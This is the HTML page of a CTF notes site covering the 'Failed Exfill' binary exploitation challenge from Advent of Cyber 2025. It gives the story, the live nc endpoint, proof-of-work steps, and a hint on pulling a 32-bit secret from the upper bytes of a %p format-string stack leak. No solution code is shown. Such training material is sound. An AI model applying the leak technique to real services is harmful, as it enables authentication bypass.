@@ -1,0 +1,2076 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://dhicosatria.github.io/ctf/advent-of-cyber_cyberstudent_2025/day_7_Failed-Exfil/">
+      
+      
+        <link rel="prev" href="../day_6_KDNU-3B/">
+      
+      
+        <link rel="next" href="../day_8_Log-Folly/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Failed exfil - Rubberdust Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../styles/extra.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/fonts/material-icons.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/light.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/material.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/backdrop.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/shift-away.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/scale.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/tippy/tippy.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/core/core.css">
+    
+      <link rel="stylesheet" href="../../../assets/document_dates/user.config.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#day-7-failed-exfill" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Rubberdust Notes" class="md-header__button md-logo" aria-label="Rubberdust Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Rubberdust Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Failed exfil
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../labs_simulate/" class="md-tabs__link">
+          
+  
+  
+  Labs Simulation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../project/" class="md-tabs__link">
+          
+  
+  
+  Projects
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../test/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Test
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Rubberdust Notes" class="md-nav__button md-logo" aria-label="Rubberdust Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+
+    </a>
+    Rubberdust Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CTF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Events
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Events
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Advent of Cyber 2025 (Cyberstudent)
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Advent of Cyber 2025 (Cyberstudent)
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_1_The-Mission-Begins/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Mission Begins
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_2_The-First-Strike/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The First Strike
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_3_Syndicate-Infrastructure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Syndicate Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_4_The-Elf%27s-Wager/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Elf's Wager
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_5_Kramazon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kramazon
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_6_KDNU-3B/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    KDNU-3B
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Failed exfil
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Failed exfil
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-story" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge Story
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_8_Log-Folly/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Log Folly
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_9_Time-to-Escalate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Time to Escalate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_10_Jingle%27s-Validator/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Jingle's Validator
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_11_Syndiware/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Syndiware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_12_Re-Key-very/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Re-Key-Very
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_13_Holiday-Routing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Holiday Routing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_14_Multifactorial/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Multifactorial
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day_17_Guide-My-Drone-Tonight/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guide My Drone Tonight
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3">
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Categories
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Categories
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../forensics/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Forensics
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../labs_simulate/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Labs Simulation
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../project/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Projects
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-story" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge Story
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation">
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    CTF
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Events
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Advent of Cyber 2025 (Cyberstudent)
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="day-7-failed-exfill">day 7 Failed Exfill<a class="headerlink" href="#day-7-failed-exfill" title="Permanent link">¶</a></h1>
+<p>category : Binary exploitation</p>
+<h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">¶</a></h2>
+<p>The KRAMPUS Syndicate has been using a small remote endpoint they quietly dropped on compromised NPLD machines. When they gain access to a system, they connect to this endpoint and forward whatever “precious data” they’ve collected back to their infrastructure.</p>
+<p>During forensics analysis of the machines, analysts discovered the endpoint and later found a screenshot from a dark web forum where a Syndicate member bragged about their exfiltration method which for some reason included a copy of the server binary itself.</p>
+<p>You’ve been given the screenshot and access to the live endpoint. See if you can identify a flaw in their server and extract the data they assumed was hidden.</p>
+<p>Live endpoint:&nbsp;<code>nc ctf.csd.lol 7777</code></p>
+<p>This challenge's remote instance utilizes a proof-of-work verification system to prevent brute forcing and from other bad actors.</p>
+<p>After connecting to the remote instance using&nbsp;<code>nc</code>, you must complete a proof-of-work challenge by running the command given and entering the output as the solution.</p>
+<p>If you are on Windows, please download the&nbsp;<a href="https://github.com/redpwn/pow/releases/latest"><strong>solver</strong></a>&nbsp;manually (named&nbsp;<code>redpwnpow-windows-amd64.exe</code>) and run it yourself, like this in PowerShell:</p>
+<div class="highlight"><pre><span></span><code># 'challenge' is given after connecting to nc
+# (the part after '-s')
+.\redpwnpow-windows-amd64.exe &lt;challenge&gt;
+</code></pre></div>
+<p>In any case, please review the&nbsp;<a href="https://pwn.red/pow"><strong>auto-download script</strong></a>&nbsp;and&nbsp;<a href="https://github.com/redpwn/pow"><strong>solver</strong></a>&nbsp;yourself before running untrusted code on your computer. For more protection, we recommend completing the challenge in a sandboxed environment, such as a virtual machine.</p>
+<p>If you have any questions or concerns about this technology, please open a ticket in our&nbsp;<a href="https://discord.com/invite/cyberstudents-916144903686336513"><strong>Discord server</strong></a>.</p>
+<p>hint:</p>
+<p>Your format string output is giving you more than you actually need. The leak is a full 64-bit stack value, but the secret the admin function checks is only a 32-bit number. Think carefully about how those two sizes line up in memory on a 64-bit system. The part you want is already inside the value you leaked.</p>
+<p><strong><em>*When you leak a pointer using&nbsp;<code>%p</code>, you are really printing eight bytes pulled straight from the stack. The secret code sits inside those eight bytes, just not in the position you might expect. Try isolating the upper four bytes of the leaked value, interpret them as a standalone integer, then convert them to decimal. Tools like&nbsp;</em>*CyberChef</strong>&nbsp;make this extraction extremely simple.</p>
+<hr>
+<h2 id="challenge-story">Challenge Story<a class="headerlink" href="#challenge-story" title="Permanent link">¶</a></h2>
